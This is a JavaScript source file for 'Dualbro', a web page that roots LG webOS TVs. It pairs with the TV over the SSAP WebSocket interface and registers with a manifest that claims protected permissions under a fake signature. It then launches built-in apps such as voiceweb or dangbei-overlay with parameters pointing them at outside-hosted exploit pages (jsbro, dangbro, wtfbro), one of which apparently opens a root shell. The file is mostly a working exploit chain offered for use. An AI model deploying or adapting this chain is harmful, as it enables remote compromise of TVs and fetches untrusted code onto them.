const $ = (id) => document.getElementById(id);

const logEl = $('log');
const statusDot = $('statusDot');
const statusText = $('statusText');
const connectBtn = $('connectBtn');

const CONNECT_TIMEOUT_MS = 7000;
const CLIENT_KEY_PREFIX = 'webos-ssap-client-key:';
const debugMode = new URLSearchParams(window.location.search).has('debug');
const jstargetUrl = 'https://raws0kil.github.io/jsbro-autoroot/resources/jsbro/';
const dangtargetUrl = new URL('https://azoffshowy.github.io/dangbro/resources/dangbro/' + (debugMode ? '?debug' : ''), window.location.href).toString();
const wtftargetUrl = new URL('https://e.nya.je/getroot/wtfbro' + (debugMode ? '?debug' : ''), window.location.href).toString();
let targetUrl,broname, lunchpayload,appid,appname;

const state = {
  attempt: 0,
  pending: false,
  waitingForPairing: false,
  hadStoredClientKey: false,
  connectStartedAt: 0,
  launchStarted: false
};

function log(kind, data) {
  const text = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
  logEl.textContent += `[${kind}] ${text}\n\n`;
  logEl.scrollTop = logEl.scrollHeight;
}

function debugLog(kind, data) {
  if (!debugMode) return;
  log(kind, data);
}

function setStatus(type, text) {
  statusDot.className = 'dot ' + (type || '');
  statusText.textContent = text;
}

function openModal(options) {
  $('modalTitle').textContent = options.title;
  $('modalBody').textContent = options.body;
  $('modalPrimaryBtn').textContent = (options.primaryLabel || 'Retry');
  $('modalDismissBtn').textContent = (options.dismissLabel || 'Close');
  $('modalHelpBtn').textContent = (options.helpLabel || 'Browser Guide');
  $('modalPrimaryBtn').hidden = Boolean(options.hidePrimary);
  $('modalDismissBtn').hidden = Boolean(options.hideDismiss);
  $('modalHelpBtn').hidden = Boolean(options.hideHelp);
  $('modal').hidden = false;
  $('modalPrimaryBtn').onclick = () => options.onPrimary && options.onPrimary();
  $('modalHelpBtn').onclick = () => options.onHelp && options.onHelp();
  $('modalDismissBtn').onclick = () => {
    if (options.onDismiss) options.onDismiss();
    $('modal').hidden = true;
  };
}

function hideModal() {
  $('modal').hidden = true;
}

function showPairingDialog() {
  openModal({
    title: 'Approve Pairing On TV',
    body: 'The TV is asking for confirmation. Accept the pairing prompt on the TV, then this page should continue automatically.',
    primaryLabel: 'Try reconnect',
    dismissLabel: 'Keep waiting',
    hideSecondary: true,
    hideHelp: true,
    onPrimary: () => startConnect(),
    onDismiss: () => {}
  });
}

function createWsProxy() {
  return new Promise((resolve, reject) => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(`<!doctype html><html><body><script>
      let ws = null;
      let parentOrigin = '*';
      function send(type, payload) { parent.postMessage({ __ssapProxy: true, type, payload }, parentOrigin); }
      window.addEventListener('message', (event) => {
        const msg = event.data;
        if (!msg || !msg.__ssapBridgeCmd) return;
        parentOrigin = event.origin || '*';
        if (msg.type === 'connect') {
          try {
            if (ws) { try { ws.close(); } catch (_) {} }
            ws = new WebSocket(msg.url);
            ws.onopen = () => send('open', {});
            ws.onclose = (ev) => send('close', { code: ev.code, reason: ev.reason, wasClean: ev.wasClean });
            ws.onerror = () => send('error', { message: 'WebSocket error' });
            ws.onmessage = (ev) => send('message', { data: ev.data });
          } catch (err) {
            send('error', { message: err.message || String(err) });
          }
        }
        if (msg.type === 'send') {
          try {
            if (!ws || ws.readyState !== WebSocket.OPEN) throw new Error('Socket not open');
            ws.send(msg.data);
          } catch (err) {
            send('error', { message: err.message || String(err) });
          }
        }
        if (msg.type === 'close') {
          try { if (ws) ws.close(); } catch (err) { send('error', { message: err.message || String(err) }); }
        }
      });
    <\/script></body></html>`);
    iframe.onload = () => resolve({
      iframe,
      send(cmd) {
        iframe.contentWindow.postMessage({ __ssapBridgeCmd: true, ...cmd }, '*');
      }
    });
    iframe.onerror = () => reject(new Error('Failed to load proxy iframe'));
    document.body.appendChild(iframe);
  });
}

class WebOsSsapBridge extends EventTarget {
  constructor() {
    super();
    this.proxy = null;
    this.ip = '';
    this.port = '3000';
    this.reqId = 1;
    this.pending = new Map();
    this.connected = false;
    this.registered = false;
  }

  async ensureProxy() {
    if (this.proxy) return;
    this.proxy = await createWsProxy();
    window.addEventListener('message', (event) => {
      if (event.source !== this.proxy.iframe.contentWindow) return;
      const msg = event.data;
      if (!msg || !msg.__ssapProxy) return;
      if (msg.type === 'open') {
        this.connected = true;
        setStatus('warn', 'Connected, registering …');
        this.register();
        this.dispatchEvent(new CustomEvent('open'));
        return;
      }
      if (msg.type === 'close') {
        this.connected = false;
        this.registered = false;
        setStatus('', 'Disconnected');
        this.dispatchEvent(new CustomEvent('close', { detail: msg.payload || {} }));
        return;
      }
      if (msg.type === 'error') {
        setStatus('err', 'Connection failed');
        this.dispatchEvent(new CustomEvent('error', { detail: msg.payload || {} }));
        return;
      }
      if (msg.type !== 'message') return;

      let parsed;
      try {
        parsed = JSON.parse(msg.payload.data);
      } catch (_) {
        return;
      }

      this.dispatchEvent(new CustomEvent('ssap-message', { detail: parsed }));
      if (parsed.type === 'registered') {
        this.registered = true;
        setStatus('ok', 'Registered');
        const clientKey = parsed.payload && parsed.payload['client-key'];
        if (clientKey) localStorage.setItem(CLIENT_KEY_PREFIX + this.ip, clientKey);
      }
      if (parsed.id && this.pending.has(parsed.id)) {
        this.pending.get(parsed.id)(parsed);
        this.pending.delete(parsed.id);
      }
    });
  }

  async connect(ip,ssl) {
    this.ip = ip.trim();
    this.connected = false;
    this.registered = false;
    await this.ensureProxy();
    if (ssl){
    this.proxy.send({ type: 'connect', url: `wss://${this.ip}:3001` });
    } else {

    this.proxy.send({ type: 'connect', url: `ws://${this.ip}:3000` });
    }
  }

  disconnect() {
    if (this.proxy) this.proxy.send({ type: 'close' });
  }

  nextId(prefix) {
    return `${prefix}_${this.reqId++}`;
  }

  sendRaw(message) {
    if (!this.proxy) throw new Error('Proxy is not initialized');
    this.proxy.send({ type: 'send', data: JSON.stringify(message) });
  }

  register() {
    const clientKey = localStorage.getItem(CLIENT_KEY_PREFIX + this.ip) || '';
    const message = {
      id: this.nextId('register'),
      type: 'register',
      payload: {
        forcePairing: false,
        pairingType: 'PROMPT',
        manifest: {
          manifestVersion: 1,
          appVersion: '99.99',
          signed: {
            appId: 'moe.exkc.dualbro',
            created: '2025-12-08',
            permissions: [
              'TEST_SECURE',
              'READ_INSTALLED_APPS',
              'READ_RUNNING_APPS',
              'READ_NOTIFICATIONS',
              'READ_NETWORK_STATE',
              'READ_POWER_STATE',
              'READ_COUNTRY_INFO',
              'WRITE_NOTIFICATION_TOAST'
            ],
            vendorId: 'moe.exkc'
          },
          permissions: [
            'LAUNCH',
            'APP_TO_APP',
            'CLOSE',
            'TEST_OPEN',
            'TEST_PROTECTED',
            'READ_APP_STATUS',
            'READ_INSTALLED_APPS',
            'READ_NETWORK_STATE',
            'READ_RUNNING_APPS',
            'READ_POWER_STATE',
            'READ_COUNTRY_INFO',
            'WRITE_NOTIFICATION_TOAST'
          ],
          signatures: [{ signatureVersion: 1, signature: 'QwQ' }]
        }
      }
    };
    if (clientKey) message.payload['client-key'] = clientKey;
    this.sendRaw(message);
  }

  request(uri, payload, timeoutMs = 15000) {
    if (!this.connected) throw new Error('Not connected');
    const id = this.nextId('call');
    this.sendRaw({ id, type: 'request', uri, payload });
    return new Promise((resolve) => {
      this.pending.set(id, resolve);
      setTimeout(() => {
        if (!this.pending.has(id)) return;
        this.pending.delete(id);
        resolve({ id, timeout: true });
      }, timeoutMs);
    });
  }
}

const bridge = new WebOsSsapBridge();

async function warnIfDangbeiOverlayMissing() {
  let response;
  try {
    response = await bridge.request('ssap://com.webos.applicationManager/listApps', {}, 5000);
  } catch (error) {
    log('warn', 'Could not verify whether '+appname+' is installed before launch.');
    debugLog('warn-detail', error instanceof Error ? error.message : String(error));
    return;
  }

  if (response.timeout) {
    log('warn', 'listApps timed out. Could not verify whether '+appname+' is installed.');
    return;
  }

  if (response.type === 'error') {
    log('warn', 'listApps was denied by SSAP (' + (response.error || 'unknown error') + '). The app-presence check is inconclusive.');
    return;
  }

  const apps = Array.isArray(response.payload?.apps) ? response.payload.apps : [];
  let hasDangbeiOverlay = apps.some((app) => app && app.id === appid );
  if (!hasDangbeiOverlay) {
    log('warn', appid+' was not found in listApps. If nothing happens on the TV it is likely not vulnerable.');
    log('warn', 'You can try use another app if you want. (Try picking different app in entry point option after truning on advanced mode.)');

  } else {
    log('success', 'Confirmed existence of '+appname+' app.');
  }
}

async function whattouse() {
let whichhhh;
// voiceweb is kind of a holy grail 
// it existed since webos 5
// and stay unchnage since then
// also webos26 dangbei is gone but voiceweb aint
if (whichapp.value==="auto") {
if  ( webosverion.value >= 5 ) {
whichhhh="voiceweb";
} else {
whichhhh="dang";
}
} else {
	whichhhh=whichapp.value;
}
 if (whichbro.value==="dang"){
    broname="Dangbro";
    targetUrl=dangtargetUrl;
   } else if (whichbro.value==="js") {
    broname="Jsbro";
    targetUrl=jstargetUrl;
   } else {
    broname="WTFBro";
    targetUrl=wtftargetUrl;

   }

if (whichhhh==="dang") {

  appid="com.webos.app.dangbei-overlay";
	appname="dangbei-overlay";

    lunchpayload={
    id: 'com.webos.app.dangbei-overlay',
    params: {
      source: 'dualbro',
      target: targetUrl
    }};
	} else if (whichhhh==="tiny"){
		appid="com.webos.app.tinybrowser"
                 
		appname="tinybrowser";
 lunchpayload={
    id: 'com.webos.app.tinybrowser',
    params: {
      source: 'dualbro',
      contentTarget: targetUrl
    }};
	} else if (whichhhh==="voiceweb"){
		appid="com.webos.app.voiceweb";
		appname="voiceweb";
lunchpayload={
    id: 'com.webos.app.voiceweb',
    params: {
      source: 'dualbro',
      URL: targetUrl
    }};
	}

return
}

function debugmgs() {
 if (whichbro.value==="dang"){
  debugLog('Dangbro','Debug mode — log upload enabled.');
   } else if (whichbro.value==="js") {
  debugLog('Jsbro','Debug mode — Debug mode is non-existent.');
   } else {
  debugLog('WTFBro','Debug mode — Temporal root shell is on.');

   }
	

}

async function launchDangbro() {

   if (state.launchStarted) return;
  state.launchStarted = true;
  debugLog('request', {
    uri: 'ssap://system.launcher/launch',
    lunchpayload,
  });
  const response = await bridge.request('ssap://system.launcher/launch', lunchpayload);
  if (response.timeout) {
    state.launchStarted = false;
    throw new Error(broname+' launch timed out :/');
  }

  debugLog('response', response.payload || response);
  setStatus('ok', 'Connected, launch sent');
}

bridge.addEventListener('open', () => {
  log('connect', `TV reached. Starting SSAP registration for ${bridge.ip}.`);
  if (!state.hadStoredClientKey) {
    state.waitingForPairing = true;
    setStatus('warn', 'Confirm pairing on TV');
    log('pair', 'Waiting for confirmation on the TV screen.');
    showPairingDialog();
    return;
  }

  debugLog('pair', 'Using stored client key. Waiting for registration result.');
});

bridge.addEventListener('error', () => {
  state.waitingForPairing = false;
  if (!state.pending) return;
  state.pending = false;
  state.launchStarted = false;
var	title,body;
var ssaphtpp=ssltoggle.checked ? 'https://' : 'http://';
var ssapport=ssltoggle.checked ? ':3001' : ':3000';
var ssapurl= ssaphtpp+ tvip.value + ssapport;
	if (tvip.value==="127.0.0.1"){
title = 'Connection Failed';
  body = `Open this page in tv\'s web browser.

If you opened this page in the tv's browser and it still dont work then try the fellowing :
Open this page on your device that isnt the tv you are trying to root
Then turn on Advanced Mode by ticking the checkbox
Next tick the ssl 
After that type your tv ip into TV IP
Then Click Root the TV :3 to root the tv` ;

	} else {
 title = 'Connection Failed';
  body = `Cant reach over web socket,Maybe your browser has blocked local ip or self signed ssl cert or both.
Maybe those link as below can help :
https://bugzilla.mozilla.org/show_bug.cgi?id=1973932
https://codeberg.org/celenity/Phoenix/issues/162
https://help.motorolanetwork.com/kb/general/troubleshooting-connection-isn-t-private-message 
` ;

	}
   setStatus('err', 'Connection failed');
  log('error', "Conection Failed,cant reach the TV :/");
  openModal({
    title,
    body,
    primaryLabel: 'Try reconnect',
    dismissLabel: 'Close',
    helpLabel : (tvip.value==="127.0.0.1") ? 'Browser Guide' : 'Open cert',
    onPrimary: () => startConnect(),
    onHelp: () => window.open( (tvip.value==="127.0.0.1") ?'https://www.youtube.com/watch?v=YyiLBZmrLns': ssapurl, '_blank', 'noopener,noreferrer'),
  });
});

bridge.addEventListener('ssap-message', async (event) => {
  const msg = event.detail;
  if (msg.type === 'response' && msg.payload?.pairingType === 'PROMPT') {
    state.waitingForPairing = true;
    setStatus('warn', 'Confirm pairing on TV');
    log('pair', 'Pairing prompt detected. Please accept it on the TV.');
    showPairingDialog();
    return;
  }

  if (msg.type !== 'registered') return;

  state.pending = false;
  state.waitingForPairing = false;
  hideModal();
  log('connect', state.hadStoredClientKey
    ? 'Connected. Existing client key accepted.'
    : 'Connected. Pairing completed and the TV is ready.');
await whattouse();
await warnIfDangbeiOverlayMissing();
  log('launch', "Starting automatic "+appname+" launch to "+broname+" ("+targetUrl+")");
 


  try {
 await launchDangbro();
} catch (error) {
    state.launchStarted = false;
    setStatus('err', 'Launch failed');
    log('error', error instanceof Error ? error.message : String(error));
  }
});

async function startConnect() {
  
  if (tvip.value=="") {
    log('error', 'Please enter your tv\'s local ip');
    return;
  }
  if (webosverion.value=="" && whichapp.value=="auto") {
    log('error', 'Please enter your tv webos version.');
    return;
  }
  state.attempt += 1;
  state.pending = true;
  state.waitingForPairing = false;
  state.hadStoredClientKey = Boolean(localStorage.getItem(CLIENT_KEY_PREFIX + tvip.value));
  state.connectStartedAt = Date.now();
  state.launchStarted = false;
  
      hideModal();
  bridge.disconnect();
  setStatus('warn', 'Connecting …');
	var protcias = ssltoggle.checked ? 'wss://' : 'ws://';
  log('connect', 'Trying to reach TV at '+ protcias + tvip.value);

  const attempt = state.attempt;

  try {
    await bridge.connect(tvip.value,ssltoggle.checked);
  } catch (error) {
    state.pending = false;
    setStatus('err', 'Connection failed');
    log('error', error instanceof Error ? error.message : String(error));
    return;
  }

  setTimeout(() => {
    if (attempt !== state.attempt) return;
    if (state.waitingForPairing || bridge.registered || !state.pending) return;
    state.pending = false;
    setStatus('err', 'Connection failed');
    log('error', 'TV did not answer in time.Cant reach the TV :/');
    openModal({
      title: 'Connection Failed',
      body: 'TV did not answer in time.Cant reach the TV :/',
      primaryLabel: 'Try reconnect',
      dismissLabel: 'Close',
      hideHelp: true,
      onPrimary: () => startConnect()
    });
    bridge.disconnect();
  }, CONNECT_TIMEOUT_MS);
}

connectBtn.addEventListener('click', () => startConnect());
$('modalDismissBtn').addEventListener('click', () => hideModal());

debugtoggle.addEventListener('click', () => {
if (debugMode){
window.location=window.location.protocol+'//'+window.location.host+window.location.pathname;
} else {
window.location=window.location.protocol+'//'+window.location.host+window.location.pathname+'?debug';

}

});
   advtoggle.addEventListener("click", function(event) {
	   advtogglede.open=advtoggle.checked;

   });

  
(() => {
  setStatus('', 'Idle');
	debugtoggle.checked=debugMode;
	advtoggle.checked=debugMode;
	advtogglede.open=advtoggle.checked;
whichbro.addEventListener("change", debugmgs); 
  log('boot', 'Dualbro is ready.Time to root to the TV :3');
debugmgs();
	
 openModal({
	 title : "Welcome to Dualbro - A entry point for jsbro/dangbro/wtfbro !!!",
    body:`Let me explain to how to use this page.
First open settings and go to support then TV Information to check your webos version
Then open this page on your tv's browser
Next fill in WebOS Version
After then Click Root the TV :3 to root the tv
If that dont work then try the fellowing :
Open this page on your device that isnt the tv you are trying to root
Then turn on Advanced Mode by ticking the checkbox
Next tick the ssl 
After that type your tv ip into TV IP
Then Click Root the TV :3 to root the tv
`,
    hidePrimary:true,
    hideHelp:true,
    dismissLabel: 'Close',
  });
})();
